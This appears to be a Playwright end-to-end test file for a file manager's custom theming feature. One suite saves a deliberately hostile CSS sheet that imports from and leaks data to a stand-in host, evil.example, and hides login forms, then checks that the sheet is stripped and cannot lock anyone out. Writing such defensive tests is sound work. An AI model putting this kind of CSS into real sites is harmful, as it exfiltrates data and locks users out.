/**
 * tema:v1 — an operator makes filex look like their own product.
 *
 * The unit tests pin the pieces: the derivations, the validator, the tenant
 * refusal, the palette registry. What only a browser can answer is whether the
 * pieces meet — whether a theme composed on one screen is actually painting a
 * different screen, and whether a stranger with no account sees it too.
 *
 * Two walks:
 *
 *  1. COMPOSE → APPLY → SEE IT SOMEWHERE ELSE → SEE IT ON A PUBLIC LINK.
 *     The tokens are read back with `getComputedStyle`, not by looking at
 *     screenshots: a palette that is registered but never painted computes to
 *     the stock value and looks completely normal, which is exactly how the
 *     sign-in page went unthemed until it was measured here.
 *
 *  2. THE ESCAPE HATCH CANNOT LOCK ANYBODY OUT. A deliberately hostile sheet
 *     is saved, and the two surfaces that must survive it are measured: the
 *     sign-in page (which never receives it) and the admin screen that removes
 *     it (which suspends it, and is carved out of its scope besides).
 */
import { test, expect, type Page } from '@playwright/test';
import { loginAs, dismissInstallBanner, logout } from '../helpers/auth';
import { dropStorageByName, newAuthedRequest, seedLocalStorage } from '../helpers/seed';

const STORAGE = `e2e-theme98-${Date.now()}`;
const MOUNT = `/tmp/filex-${STORAGE}`;
const FILE_NAME = 'rapor.txt';

const THEME_KEY = 'e2e-acme';
const THEME_ID = `custom:${THEME_KEY}`;
/** Nothing in the stock palette is near this, so a match cannot be a coincidence. */
const BRAND = '#7a1f5c';
const BRAND_BG = '#fffaf7';
const BRAND_RADIUS = '14px';

/** Read a `--fe-*` token as the browser actually resolves it. */
function token(page: Page, name: string) {
  return page.evaluate(
    (n) => getComputedStyle(document.documentElement).getPropertyValue(n).trim(),
    name,
  );
}

test.describe('tema:v1 — a custom theme, composed and worn', () => {
  test.beforeAll(async ({ request }) => {
    await dropStorageByName(request, STORAGE);
    await seedLocalStorage(request, STORAGE, MOUNT);
  });

  test.afterAll(async ({ playwright, baseURL, request }) => {
    const api = await newAuthedRequest(playwright, baseURL ?? '');
    await api.delete(`/api/admin/themes/${THEME_KEY}`);
    await api.patch('/api/admin/settings', {
      data: { 'ui.default_theme': 'default', 'ui.custom_css': '', 'ui.custom_css_enabled': 'false' },
    });
    await api.dispose();
    await dropStorageByName(request, STORAGE);
  });

  test('compose it in the admin panel, and it appears beside the built-in palettes', async ({
    page,
  }) => {
    await dismissInstallBanner(page);
    await loginAs(page);
    await page.goto('/admin/appearance');

    await expect(page.getByTestId('appearance-page')).toBeVisible();

    await page.getByTestId('theme-name').locator('input').fill('Acme Bulut');
    // The key is suggested from the name; type our own so the cleanup knows it.
    await page.getByTestId('theme-key').locator('input').fill(THEME_KEY);
    await page.getByTestId('tokhex---fe-primary').fill(BRAND);
    await page.getByTestId('tokhex---fe-bg').fill(BRAND_BG);
    await page.getByTestId('theme-radius').locator('input').fill('14');

    // The preview is painted by the draft, not by a mock-up.
    await expect(page.getByTestId('theme-preview')).toHaveAttribute(
      'style',
      new RegExp(`--fe-primary:\\s*${BRAND}`),
    );

    await page.getByTestId('theme-save').click();

    // It is stored, prefixed, and on the PUBLIC palette payload.
    await expect
      .poll(async () => {
        const res = await page.request.get('/api/appearance');
        const body = await res.json();
        return (body.themes ?? []).map((t: { id: string }) => t.id);
      })
      .toContain(THEME_ID);

    await expect(page.getByText(THEME_ID)).toBeVisible();
  });

  test('applying it paints a DIFFERENT page, not just the editor', async ({ page }) => {
    await dismissInstallBanner(page);
    await loginAs(page);

    // Choose it the way a person does — the palette id this browser remembers.
    await page.addInitScript((id) => localStorage.setItem('filex.palette', id), THEME_ID);

    await page.goto('/admin/explore');
    // ⚠ Measured, not eyeballed. A palette that is registered but never
    // painted resolves to the stock value and looks entirely normal.
    await expect.poll(() => token(page, '--fe-primary')).toBe(BRAND);
    expect(await token(page, '--fe-bg')).toBe(BRAND_BG);
    expect(await token(page, '--fe-radius')).toBe(BRAND_RADIUS);

    // A second, unrelated admin page wears it too.
    await page.goto('/admin/users');
    await expect.poll(() => token(page, '--fe-primary')).toBe(BRAND);
  });

  test('made the instance default, it reaches a page with no account at all', async ({
    page,
    playwright,
    baseURL,
    browser,
  }) => {
    const api = await newAuthedRequest(playwright, baseURL ?? '');
    await api.patch('/api/admin/settings', { data: { 'ui.default_theme': THEME_ID } });

    // A PIN-gated share renders a server-side page, which is the surface a
    // stranger actually lands on.
    const up = await api.post('/api/files/manager?action=upload', {
      multipart: {
        path: `${STORAGE}://`,
        file: { name: FILE_NAME, mimeType: 'text/plain', buffer: Buffer.from('theme bytes') },
      },
    });
    expect(up.ok()).toBeTruthy();

    const shareRes = await api.post('/api/files/share', {
      data: { path: `${STORAGE}://${FILE_NAME}`, kind: 'file', pin: '4821' },
    });
    expect(shareRes.ok()).toBeTruthy();
    const shareURL: string = (await shareRes.json()).share.url;
    await api.dispose();

    // ⚠⚠ A BRAND-NEW CONTEXT: no cookies, no localStorage, nobody's account.
    // An anonymous visitor's page may not depend on anybody's preferences, so
    // this is the only honest way to measure it.
    const anon = await browser.newContext();
    const anonPage = await anon.newPage();

    // ── the page a JavaScript browser gets ──────────────────────────────
    //
    // ⚠⚠ THE SURFACE MOVED UNDER THIS TEST. A `/s/` link used to be HTML that
    // Go wrote by hand, wearing the `--px-*` vocabulary of
    // `handlers/share.go`'s `publicPageStyle`; since "a public door that is
    // actually closed" (feat/app-plugins) a JavaScript browser is answered
    // with the SPA shell instead (`routes.go` → `wantsPublicShell`), and the
    // PIN gate it draws is `packages/core`'s `PublicPinGate.vue`, which speaks
    // `--fe-*` like the rest of the product. Measured 2026-09-21: the theme
    // was correctly on this page all along (`--fe-primary` = the brand, and
    // `<style data-filex-theme>` present), and it was the ASSERTION that was
    // reading a token this surface no longer has — `--px-accent` came back
    // `""`, not the stock blue, because it is not declared here at all.
    //
    // ⚠ The token names changed; the QUESTION did not. Both readers still
    // exist, so both are measured.
    await anonPage.goto(shareURL);
    await expect(anonPage.getByTestId('public-page-pin')).toBeVisible();

    await expect.poll(() => token(anonPage, '--fe-primary')).toBe(BRAND);
    expect(await token(anonPage, '--fe-bg'), 'the PIN page must follow the instance theme').toBe(
      BRAND_BG,
    );

    // And the operator's colour is really on the button a stranger presses.
    const btnBg = await anonPage.evaluate(() => {
      const b = document.querySelector('[data-testid="public-page-pin-submit"]');
      return b ? getComputedStyle(b).backgroundColor : '';
    });
    expect(btnBg, 'the submit button wears the instance primary').toBe('rgb(122, 31, 92)');

    // ── and the page a browser with no JavaScript gets ──────────────────
    //
    // ⚠ Still served, still themed, and it is the reader the `--px-*` set was
    // written for: `?nojs` is the shell's own escape hatch
    // (`handlers/public_shell.go` → publicShellQueryEscapes), so this is the
    // Go PIN form with `publicThemeCSS` on it. Dropping this half when the SPA
    // arrived would have left the fallback free to lose the theme with nothing
    // to notice.
    const nojs = await anon.newPage();
    await nojs.goto(`${shareURL}${shareURL.includes('?') ? '&' : '?'}nojs=1`);
    const accent = await nojs.evaluate(() =>
      getComputedStyle(document.documentElement).getPropertyValue('--px-accent').trim(),
    );
    expect(accent, 'the no-JS PIN page must follow the instance theme too').toBe(BRAND);
    const nojsBtn = await nojs.evaluate(() => {
      const b = document.querySelector('.btn');
      return b ? getComputedStyle(b).backgroundColor : '';
    });
    expect(nojsBtn).toBe('rgb(122, 31, 92)');

    await anon.close();
  });

  test('signed out, the page wears the INSTANCE — not the last person at this browser', async ({
    browser,
    playwright,
    baseURL,
  }) => {
    // ⚠⚠ The owner's rule, 2026-09-21: "logoutluyken zaten seçtiğim tema
    // değil, şirketin default, yoksa filex'in default teması gelecek;
    // tarayıcı gece modundaysa gece modunda olacak ya da light mode."
    const api = await newAuthedRequest(playwright, baseURL ?? '');
    await api.patch('/api/admin/settings', { data: { 'ui.default_theme': THEME_ID } });
    await api.dispose();

    // A browser somebody used and walked away from WITHOUT signing out — an
    // expired cookie, a closed tab, the next person sitting down. The stale
    // session hint is the whole point: with it the old code read their palette
    // at module load AND `hasOwnChoice()` stood the operator's own default
    // down, so the brand never reached the one page every customer sees first.
    const ctx = await browser.newContext();
    const page = await ctx.newPage();
    await page.addInitScript(() => {
      localStorage.setItem('filex.palette', 'night');
      localStorage.setItem('filex.thememode', 'dark');
      localStorage.setItem('filex.theme', 'dark');
      localStorage.setItem('filex.session', '1');
    });

    await page.goto('/admin/login');
    await expect(page.locator('input[type="password"]')).toBeVisible();

    // ⚠ POLLED, and the poll is not decoration: a forged hint is believed for
    // exactly as long as `/api/auth/me` takes to contradict it. That round
    // trip is the entire remaining window, and after a real sign-out there is
    // none at all because the hint is already gone.
    await expect.poll(() => token(page, '--fe-primary')).toBe(BRAND);
    expect(await token(page, '--fe-bg')).toBe(BRAND_BG);

    // ⚠ And the BROWSER decides light or dark. This context is light, so a
    // `filex.theme` of `dark` left behind by the previous person must not
    // darken the sign-in page.
    await expect
      .poll(() => page.evaluate(() => document.documentElement.classList.contains('dark')))
      .toBe(false);

    // ⚠ The keys are not merely unread, they are gone — owner: "oturum
    // kapanınca temizlersek localstorage'ı tamamız ya o kısımda". (The init
    // script writes them again on the NEXT navigation; this measures the load
    // they were cleared on.)
    await expect.poll(() => page.evaluate(() => localStorage.getItem('filex.palette'))).toBeNull();
    expect(await page.evaluate(() => localStorage.getItem('filex.theme'))).toBeNull();
    expect(await page.evaluate(() => localStorage.getItem('filex.session'))).toBeNull();

    // ⚠ …but the PUBLIC fact survives, or the sign-in page goes back to
    // flashing stock blue on its first frame for everybody.
    expect(await page.evaluate(() => localStorage.getItem('filex.instancetheme'))).not.toBeNull();

    await ctx.close();
  });

  test('signing out hands the browser back to the instance', async ({ page }) => {
    await dismissInstallBanner(page);
    await loginAs(page);

    // Signed in and wearing a palette of their own.
    await page.evaluate(() => localStorage.setItem('filex.palette', 'night'));
    await page.goto('/admin/explore');
    await expect.poll(() => token(page, '--fe-primary')).toBe('#2c4a9e');

    await logout(page);

    // ⚠ Through the real control (TopNav → `auth.logout()`), not by clearing
    // cookies: this is the wiring no unit test can reach.
    await expect.poll(() => token(page, '--fe-primary')).toBe(BRAND);
    expect(await page.evaluate(() => localStorage.getItem('filex.palette'))).toBeNull();
    expect(await page.evaluate(() => localStorage.getItem('filex.session'))).toBeNull();
  });
});

test.describe('tema:v1 — the escape hatch cannot lock anybody out', () => {
  // A sheet that tries every trick this feature has to survive: hide the
  // immune screen, blank the sign-in form, phone home, pull in a remote sheet.
  const HOSTILE = [
    '@import url("https://evil.example/x.css");',
    '.fe-css-immune, .fe-css-immune * { display: none !important; }',
    '.fe-list__row { background: url(https://evil.example/leak?row); }',
    'form, input, button { display: none !important; }',
    'body { outline: 3px solid #ff00ff; }',
  ].join('\n');

  test.beforeAll(async ({ playwright, baseURL }) => {
    const api = await newAuthedRequest(playwright, baseURL ?? '');
    await api.patch('/api/admin/settings', {
      data: { 'ui.custom_css': HOSTILE, 'ui.custom_css_enabled': 'true' },
    });
    await api.dispose();
  });

  test.afterAll(async ({ playwright, baseURL }) => {
    const api = await newAuthedRequest(playwright, baseURL ?? '');
    await api.patch('/api/admin/settings', {
      data: { 'ui.custom_css': '', 'ui.custom_css_enabled': 'false' },
    });
    await api.dispose();
  });

  test('what is served has been stripped of every way to reach the network', async ({
    playwright,
    baseURL,
  }) => {
    const api = await newAuthedRequest(playwright, baseURL ?? '');
    const body = await (await api.get('/api/me/custom-css')).json();
    await api.dispose();

    expect(body.enabled).toBe(true);
    expect(body.css).not.toContain('@import');
    expect(body.css).not.toContain('evil.example');
    expect(body.css).toContain('url("data:,")');
    expect(body.css).toContain('@scope (:root) to (.fe-css-immune)');
  });

  test('the sign-in page never receives it, but still wears the THEME', async ({ browser }) => {
    const anon = await browser.newContext();
    const page = await anon.newPage();

    // Anonymous: the endpoint that carries the sheet is behind auth.
    const res = await page.request.get('/api/me/custom-css');
    expect(res.status(), 'an anonymous visitor may not even download it').toBe(401);

    await page.goto('/admin/login');
    await expect(page.locator('input[type="password"]')).toBeVisible();
    expect(
      await page.evaluate(() => !!document.head.querySelector('style[data-filex-custom]')),
      'the sign-in page must not wear the operator stylesheet',
    ).toBe(false);
    // …and the hostile rule therefore did not apply.
    const outline = await page.evaluate(() => getComputedStyle(document.body).outlineColor);
    expect(outline).not.toBe('rgb(255, 0, 255)');

    // The public branding payload the login page DOES fetch carries no sheet.
    const branding = await (await page.request.get('/api/branding')).json();
    expect(Object.keys(branding)).not.toContain('custom_css');

    await anon.close();
  });

  test('the screen that removes it is reachable and usable while it is live', async ({ page }) => {
    await dismissInstallBanner(page);
    await loginAs(page);

    // First prove the sheet really is live somewhere else, or this test could
    // pass against a feature that simply never applied.
    await page.goto('/admin/explore');
    await expect
      .poll(() => page.evaluate(() => getComputedStyle(document.body).outlineColor))
      .toBe('rgb(255, 0, 255)');

    await page.goto('/admin/appearance');

    // GUARD A — the route takes the sheet out of the document entirely. This
    // is the one that survives `:root { display: none }`, which no amount of
    // scoping can undo.
    await expect
      .poll(() => page.evaluate(() => !!document.head.querySelector('style[data-filex-custom]')))
      .toBe(false);

    await expect(page.getByTestId('appearance-page')).toBeVisible();
    await expect(page.getByTestId('custom-css-remove')).toBeVisible();

    // GUARD B — even with guard A defeated, the @scope donut hole keeps the
    // panel out of the sheet's reach. Force the served sheet in and measure.
    await page.evaluate(async () => {
      const { css } = await (await fetch('/api/me/custom-css', { credentials: 'include' })).json();
      const el = document.createElement('style');
      el.setAttribute('data-guard-b-probe', '');
      el.textContent = css;
      document.head.appendChild(el);
    });

    // The sheet is demonstrably active on this very document…
    expect(await page.evaluate(() => getComputedStyle(document.body).outlineColor)).toBe(
      'rgb(255, 0, 255)',
    );
    // …and the immune panel is untouched by it.
    await expect(page.getByTestId('appearance-page')).toBeVisible();
    await expect(page.getByTestId('custom-css-remove')).toBeVisible();

    await page.evaluate(() =>
      document.head.querySelector('style[data-guard-b-probe]')?.remove(),
    );

    // And one click turns it off for good.
    page.once('dialog', (d) => d.accept());
    await page.getByTestId('custom-css-remove').click();

    await expect
      .poll(async () => (await (await page.request.get('/api/me/custom-css')).json()).enabled)
      .toBe(false);
  });
});
